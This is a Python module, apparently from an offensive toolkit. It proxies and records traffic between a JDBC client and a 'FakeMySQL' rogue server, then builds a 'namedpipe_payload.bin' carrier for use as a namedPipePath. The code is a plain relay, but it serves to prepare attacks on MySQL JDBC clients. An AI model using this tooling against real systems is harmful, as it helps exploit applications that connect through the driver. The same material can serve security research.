import select
import socket
import sys
import threading
import time
from datetime import datetime
from pathlib import Path
from typing import Optional

from .recorder import SessionRecorder
from .carrier import build_random_access_carrier, CarrierBuildError


class StopController:
    def __init__(self):
        self.stop = threading.Event()
        self.listener: Optional[socket.socket] = None
        self.client: Optional[socket.socket] = None
        self.upstream: Optional[socket.socket] = None

    def request_stop(self):
        self.stop.set()
        for s in [self.listener, self.client, self.upstream]:
            if s is not None:
                try:
                    s.shutdown(socket.SHUT_RDWR)
                except Exception:
                    pass
                try:
                    s.close()
                except Exception:
                    pass


def start_console_exit_thread(controller: StopController):
    def worker():
        print("[+] console control: type 'exit' then press Enter to stop and save.")
        while not controller.stop.is_set():
            try:
                line = sys.stdin.readline()
            except Exception:
                return
            if not line:
                time.sleep(0.1)
                continue
            if line.strip().lower() in ("exit", "quit", "q"):
                print("[+] exit requested")
                controller.request_stop()
                return
    t = threading.Thread(target=worker, daemon=True)
    t.start()


def _make_session_dir(out_dir: Path) -> Path:
    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    session = out_dir / ("session_" + stamp)
    i = 1
    while session.exists():
        session = out_dir / ("session_%s_%02d" % (stamp, i))
        i += 1
    session.mkdir(parents=True, exist_ok=True)
    return session


def _set_socket_options(sock: socket.socket):
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)


def run_capture(listen_host: str, listen_port: int, upstream_host: str, upstream_port: int,
                out_dir: Path, buffer_size: int, idle_timeout: float, keep_listening: bool):
    out_dir.mkdir(parents=True, exist_ok=True)
    controller = StopController()
    start_console_exit_thread(controller)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        controller.listener = listener
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((listen_host, listen_port))
        listener.listen(5)
        listener.settimeout(0.5)

        print("[+] capture proxy listening: %s:%d" % (listen_host, listen_port))
        print("[+] forwarding to FakeMySQL: %s:%d" % (upstream_host, upstream_port))
        print("[+] output dir: %s" % out_dir.resolve())

        while not controller.stop.is_set():
            try:
                client_sock, client_addr = listener.accept()
            except socket.timeout:
                continue
            except OSError:
                break

            controller.client = client_sock
            print("[+] JDBC connected: %r" % (client_addr,))
            session_dir = _make_session_dir(out_dir)
            recorder = SessionRecorder(session_dir)
            carrier_path = None
            validation_ok = False
            validation_error = None

            upstream_sock: Optional[socket.socket] = None
            try:
                recorder.log("connecting upstream FakeMySQL %s:%d" % (upstream_host, upstream_port))
                upstream_sock = socket.create_connection((upstream_host, upstream_port), timeout=5)
                controller.upstream = upstream_sock
                _set_socket_options(client_sock)
                _set_socket_options(upstream_sock)
                client_sock.setblocking(False)
                upstream_sock.setblocking(False)
                recorder.log("connected upstream")

                last_activity = time.time()
                sockets = [client_sock, upstream_sock]
                while not controller.stop.is_set():
                    now = time.time()
                    if idle_timeout > 0 and now - last_activity >= idle_timeout:
                        recorder.log("idle timeout reached; closing current session")
                        break
                    try:
                        readable, _, _ = select.select(sockets, [], [], 0.25)
                    except (OSError, ValueError):
                        break
                    if not readable:
                        continue

                    # Process one readiness at a time. If both are ready, prefer server-to-client first
                    # because MySQL server speaks first and this helps stable carrier layout.
                    ordered = []
                    if upstream_sock in readable:
                        ordered.append(upstream_sock)
                    if client_sock in readable:
                        ordered.append(client_sock)

                    for src in ordered:
                        if src not in sockets:
                            continue
                        try:
                            data = src.recv(buffer_size)
                        except BlockingIOError:
                            continue
                        except OSError:
                            data = b""
                        if not data:
                            recorder.log("socket closed by %s" % ("FakeMySQL" if src is upstream_sock else "JDBC"))
                            sockets = []
                            break
                        last_activity = time.time()
                        if src is upstream_sock:
                            recorder.record("s2c", data)
                            try:
                                client_sock.sendall(data)
                            except OSError:
                                sockets = []
                                break
                        else:
                            recorder.record("c2s", data)
                            try:
                                upstream_sock.sendall(data)
                            except OSError:
                                sockets = []
                                break
                    if not sockets:
                        break

                try:
                    client_sock.close()
                except Exception:
                    pass
                try:
                    upstream_sock.close()
                except Exception:
                    pass

                recorder.log("building verified namedpipe_payload.bin")
                carrier_path = build_random_access_carrier(recorder.events, session_dir)
                validation_ok = True
                recorder.log("carrier OK: %s" % carrier_path)

            except CarrierBuildError as e:
                validation_error = str(e)
                recorder.log("carrier build/validation failed: %s" % validation_error)
            except Exception as e:
                validation_error = repr(e)
                recorder.log("session error: %s" % validation_error)
            finally:
                recorder.finish_summary(carrier_path, validation_ok, validation_error)
                recorder.close_files()
                controller.client = None
                controller.upstream = None
                try:
                    client_sock.close()
                except Exception:
                    pass
                if upstream_sock:
                    try:
                        upstream_sock.close()
                    except Exception:
                        pass
                print("[+] saved session: %s" % session_dir)
                if validation_ok:
                    print("[+] use for namedPipePath: %s" % carrier_path)
                else:
                    print("[!] carrier invalid; check events.log")

            if not keep_listening:
                break

    print("[+] stopped")
